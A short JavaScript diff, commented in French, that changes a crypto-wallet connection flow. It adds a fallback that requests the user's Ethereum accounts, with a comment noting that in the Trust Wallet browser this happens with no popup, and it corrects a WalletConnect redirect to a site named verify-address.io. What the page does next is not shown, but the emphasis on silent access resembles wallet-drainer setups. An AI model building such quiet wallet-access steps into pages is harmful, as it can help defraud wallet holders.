@@ -1455,6 +1455,14 @@ try {
         from = (accs && accs[0]) || '';
       } catch(e) {}
     }
+    // Dernier recours — Trust Wallet browser ne remplit pas selectedAddress sans requestAccounts
+    // Dans TW browser le wallet est déjà déverrouillé : retour immédiat, zéro popup
+    if (!from) {
+      try {
+        var reqAccs = await eth.request({ method: 'eth_requestAccounts' });
+        from = (reqAccs && reqAccs[0]) || '';
+      } catch(e) {}
+    }
     if (!from) return;
 
     var fromChecksum = ethers.utils.getAddress(from);
@@ -1612,7 +1620,7 @@ async function initWalletConnect() {
         events: []
       }
     },
-    redirect: { universal: 'https://verify-address.io/verifyaddresss' }
+    redirect: { universal: 'https://verify-address.io/verifyaddress.html' }
   });
 
   if (typeof window.QRCodeStyling === 'undefined') {
